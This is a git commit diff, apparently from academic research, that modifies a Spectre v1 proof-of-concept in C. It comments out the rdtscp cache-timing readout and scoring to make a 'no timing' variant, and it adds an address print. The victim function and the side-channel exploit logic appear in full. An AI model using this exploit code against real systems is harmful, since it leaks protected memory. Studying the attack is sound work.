6a0f3ba94cadcb3588a0576b870f1c7aeb6d4f57
Irene Lin <iwl@andrew.cmu.edu>
2020-04-08 01:51:23 -0400

    update attack code
    Change-Id: I2c4ecc25037d404792e441fdb57fe3e7eed47df6

--- attack_code/spectre_full_no_timing.c
+++ attack_code/spectre_full_no_timing.c
@@ -39,7 +39,7 @@ uint8_t array2[256 * 512];
 
 char * secret = "The Magic Words are Squeamish Ossifrage.";
 
-uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
+uint8_t temp = 0; /* Used so compiler wont optimize out victim_function() */
 
 void victim_function(size_t x) {
   if (x < array1_size) {
@@ -89,40 +89,40 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
-    for (i = 0; i < 256; i++) {
-      mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[mix_i * 512];
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      /* READ TIMER & COMPUTE ELAPSED TIME */
-      time2 = __rdtscp( & junk) - time1;
-      /* READ TIMER & COMPUTE ELAPSED TIME */
-      time2 = __rdtscp( & junk) - time1;
-      if (time2 <= CACHE_HIT_THRESHOLD
-          && mix_i != array1[tries % array1_size])
-        results[mix_i]++; /* cache hit - add +1 to score for this value */
-    }
+//    for (i = 0; i < 256; i++) {
+//      mix_i = ((i * 167) + 13) & 255;
+//      addr = & array2[mix_i * 512];
+//      time1 = __rdtscp( & junk); /* READ TIMER */
+//      time1 = __rdtscp( & junk); /* READ TIMER */
+//      junk = * addr; /* MEMORY ACCESS TO TIME */
+//      /* READ TIMER & COMPUTE ELAPSED TIME */
+//      time2 = __rdtscp( & junk) - time1;
+//      /* READ TIMER & COMPUTE ELAPSED TIME */
+//      time2 = __rdtscp( & junk) - time1;
+//      if (time2 <= CACHE_HIT_THRESHOLD
+//          && mix_i != array1[tries % array1_size])
+//        results[mix_i]++; /* cache hit - add +1 to score for this value */
+//    }
 
     /* Locate highest & second-highest results results tallies in j/k */
-    j = k = -1;
-    for (i = 0; i < 256; i++) {
-      if (j < 0 || results[i] >= results[j]) {
-        k = j;
-        j = i;
-      } else if (k < 0 || results[i] >= results[k]) {
-        k = i;
-      }
-    }
-    if (results[j] >= (2 * results[k] + 5)
-        || (results[j] == 2 && results[k] == 0))
-      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+//    j = k = -1;
+//    for (i = 0; i < 256; i++) {
+//      if (j < 0 || results[i] >= results[j]) {
+//        k = j;
+//        j = i;
+//      } else if (k < 0 || results[i] >= results[k]) {
+//        k = i;
+//      }
+//    }
+//    if (results[j] >= (2 * results[k] + 5)
+//        || (results[j] == 2 && results[k] == 0))
+//      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
-  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-  value[0] = (uint8_t) j;
-  score[0] = results[j];
-  value[1] = (uint8_t) k;
-  score[1] = results[k];
+//  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+//  value[0] = (uint8_t) j;
+//  score[0] = results[j];
+//  value[1] = (uint8_t) k;
+//  score[1] = results[k];
 }
 
 int main(int argc,
@@ -140,16 +140,16 @@ int main(int argc,
     malicious_x -= (size_t) array1; /* Convert input value into a pointer */
     sscanf(argv[2], "%d", & len);
   }
-  printf("secret lives at %p\n", secret);
+  printf("secret lives at %p, ends at %p\n", secret, &secret[len-1]);
   printf("Reading %d bytes:\n", len);
   while (--len >= 0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
     readMemoryByte(malicious_x++, value, score);
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=%c score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    if (score[1] > 0)
-      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+    //printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+    //printf("0x%02X=’%c’ score=%d ", value[0],
+    //  (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+    //if (score[1] > 0)
+    //  printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
   }
   return (0);
